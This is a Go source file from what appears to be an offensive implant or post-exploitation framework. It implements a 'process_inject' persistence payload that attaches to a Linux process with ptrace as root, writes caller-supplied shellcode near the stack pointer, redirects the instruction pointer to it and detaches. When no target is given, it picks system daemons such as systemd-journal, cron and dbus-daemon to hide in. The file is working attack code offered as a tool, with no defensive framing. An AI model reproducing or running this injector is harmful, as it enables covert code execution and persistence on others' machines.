//go:build linux

package payloads

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

func init() {
	Register(&ProcessInject{})
}

type ProcessInject struct{}

func (p *ProcessInject) Name() string     { return "process_inject" }
func (p *ProcessInject) Category() string { return "persistence" }
func (p *ProcessInject) Description() string {
	return "Linux process injection via ptrace (requires root)"
}

func (p *ProcessInject) Execute(args map[string]string) ([]byte, error) {
	pidStr := args["pid"]
	name := args["name"]
	// shellcode as hex string
	shellcodeHex := args["shellcode"]

	result := p.inject(pidStr, name, shellcodeHex)
	return MarshalJSON(result)
}

type injectResult struct {
	Timestamp string         `json:"timestamp"`
	Targets   []injectTarget `json:"targets"`
	Results   []string       `json:"results"`
}

type injectTarget struct {
	PID     int    `json:"pid"`
	Name    string `json:"name"`
	Status  string `json:"status"`
	Details string `json:"details,omitempty"`
}

func (p *ProcessInject) inject(pidStr, processName, shellcodeHex string) *injectResult {
	r := &injectResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	if os.Geteuid() != 0 {
		r.Results = append(r.Results, "Root privileges required for ptrace injection")
		return r
	}

	if pidStr != "" {
		var pid int
		fmt.Sscanf(pidStr, "%d", &pid)
		if pid > 0 {
			target := p.injectShellcode(pid, shellcodeHex)
			r.Targets = append(r.Targets, target)
			r.Results = append(r.Results, fmt.Sprintf("PID %d: %s", pid, target.Status))
			return r
		}
	}

	if processName != "" {
		targets := p.findProcesses(processName)
		for _, t := range targets[:min(2, len(targets))] {
			target := p.injectShellcode(t.PID, shellcodeHex)
			r.Targets = append(r.Targets, target)
			r.Results = append(r.Results, fmt.Sprintf("PID %d (%s): %s", t.PID, t.Name, target.Status))
		}
		return r
	}

	// Auto-find benign target
	targets := p.findBenignProcesses()
	for _, t := range targets[:min(2, len(targets))] {
		target := p.injectShellcode(t.PID, shellcodeHex)
		r.Targets = append(r.Targets, target)
		r.Results = append(r.Results, fmt.Sprintf("PID %d (%s): %s", t.PID, t.Name, target.Status))
	}
	return r
}

func (p *ProcessInject) findProcesses(name string) []injectTarget {
	var targets []injectTarget
	out, err := exec.Command("ps", "aux").Output()
	if err != nil {
		return targets
	}
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		if strings.Contains(line, name) {
			fields := strings.Fields(line)
			if len(fields) > 1 {
				var pid int
				fmt.Sscanf(fields[1], "%d", &pid)
				if pid > 0 && pid != os.Getpid() {
					targets = append(targets, injectTarget{
						PID:  pid,
						Name: fields[len(fields)-1],
					})
				}
			}
		}
	}
	return targets
}

func (p *ProcessInject) findBenignProcesses() []injectTarget {
	benign := []string{"systemd-journal", "systemd-logind", "cron", "irqbalance", "dbus-daemon"}
	var targets []injectTarget
	for _, name := range benign {
		targets = append(targets, p.findProcesses(name)...)
	}
	return targets
}

func (p *ProcessInject) injectShellcode(pid int, shellcodeHex string) injectTarget {
	t := injectTarget{PID: pid, Status: "failed"}

	// Get process name
	if comm, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid)); err == nil {
		t.Name = strings.TrimSpace(string(comm))
	}

	// Attach via ptrace
	err := syscall.PtraceAttach(pid)
	if err != nil {
		t.Details = fmt.Sprintf("ptrace attach failed: %v", err)
		return t
	}

	// Wait for process to stop
	var ws syscall.WaitStatus
	_, err = syscall.Wait4(pid, &ws, 0, nil)
	if err != nil {
		syscall.PtraceDetach(pid)
		t.Details = fmt.Sprintf("wait failed: %v", err)
		return t
	}

	// Get registers
	regs := &syscall.PtraceRegs{}
	err = syscall.PtraceGetRegs(pid, regs)
	if err != nil {
		syscall.PtraceDetach(pid)
		t.Details = fmt.Sprintf("getregs failed: %v", err)
		return t
	}

	// Shellcode is required - there is nothing to run without it.
	if shellcodeHex == "" {
		syscall.PtraceDetach(pid)
		t.Details = "no shellcode provided"
		return t
	}
	shellcode := hexDecode(shellcodeHex)

	// Write shellcode word by word using PTRACE_POKEDATA
	for i := 0; i < len(shellcode); i += 8 {
		var word uint64
		for j := 0; j < 8 && i+j < len(shellcode); j++ {
			word |= uint64(shellcode[i+j]) << (j * 8)
		}
		addr := uintptr(regs.Rsp - uint64(len(shellcode)) + uint64(i))
		_, _, errno := syscall.Syscall6(syscall.SYS_PTRACE, syscall.PTRACE_POKEDATA,
			uintptr(pid), addr, uintptr(word), 0, 0)
		if errno != 0 {
			t.Details = fmt.Sprintf("pokedata failed at offset %d: %v", i, errno)
			syscall.PtraceDetach(pid)
			return t
		}
	}

	// Set instruction pointer to shellcode address
	regs.Rip = regs.Rsp - uint64(len(shellcode))
	err = syscall.PtraceSetRegs(pid, regs)
	if err != nil {
		syscall.PtraceDetach(pid)
		t.Details = fmt.Sprintf("setregs failed: %v", err)
		return t
	}

	// Detach (process will execute shellcode)
	err = syscall.PtraceDetach(pid)
	if err != nil {
		t.Details = fmt.Sprintf("detach failed: %v", err)
		return t
	}

	t.Status = "success"
	t.Details = fmt.Sprintf("Injected %d bytes shellcode", len(shellcode))
	return t
}

func hexDecode(s string) []byte {
	var data []byte
	for i := 0; i < len(s)-1; i += 2 {
		var b byte
		fmt.Sscanf(s[i:i+2], "%02x", &b)
		data = append(data, b)
	}
	return data
}
